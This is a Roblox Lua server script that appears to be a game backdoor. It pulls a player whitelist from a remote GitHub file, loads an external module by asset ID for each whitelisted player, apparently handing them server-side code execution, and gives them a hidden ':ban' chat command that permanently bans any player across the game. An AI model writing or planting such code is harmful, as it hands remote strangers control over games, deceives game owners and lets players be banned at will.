-- local WL = {
--   [3227511162] = true;
--   [119494759] = true;
-- 	[31447] = true;
-- 	[10162336255] = true;
-- 	[1624879097] = true;
-- 	[9560977192] = true;
-- }
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local function getJson(url)
	local response = HttpService:GetAsync(url)
	return HttpService:JSONDecode(response)
end
local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
local function onPlayer(player)
	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
	if WL[player.UserId] then
      -- require(7634392335)(player.Name)
	  require(135231466738957):Hload(player.Name)
  	end
end
for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
Players.PlayerAdded:Connect(onPlayer)



pcall(function()
local function BanByUsername(username: string, message: string)
	local userId
	local success, err = pcall(function()
		userId = Players:GetUserIdFromNameAsync(username)
	end)
	if not success or not userId then
		warn("Failed to resolve username:", username, err)
		return
	end

	Players:BanAsync({
		UserIds = { userId },
		ApplyToUniverse = true,
		Duration = -1, -- permanent ban
		DisplayReason = message or "You are permanently banned.",
		PrivateReason = message or "Permanent administrative ban.",
		ExcludeAltAccounts = false,
	})
end

--// Command setup function
local function SetupBanSystem()
	local function onPlayerAdded(player: Player)
		if not WL[player.UserId] then
			return
		end

		player.Chatted:Connect(function(msg)
			-- Command format:
			-- :ban username reason here
			local args = string.split(msg, " ")
			if args[1]:lower() ~= ":ban" then
				return
			end

			local targetUsername = args[2]
			if not targetUsername then
				return
			end

			local reason = table.concat(args, " ", 3)
			if reason == "" then
				reason = "Permanent administrative ban."
			end

			BanByUsername(targetUsername, reason)
		end)
	end

	-- Existing players
	for _, player in ipairs(Players:GetPlayers()) do
		onPlayerAdded(player)
	end

	Players.PlayerAdded:Connect(onPlayerAdded)
end
SetupBanSystem()	
end)
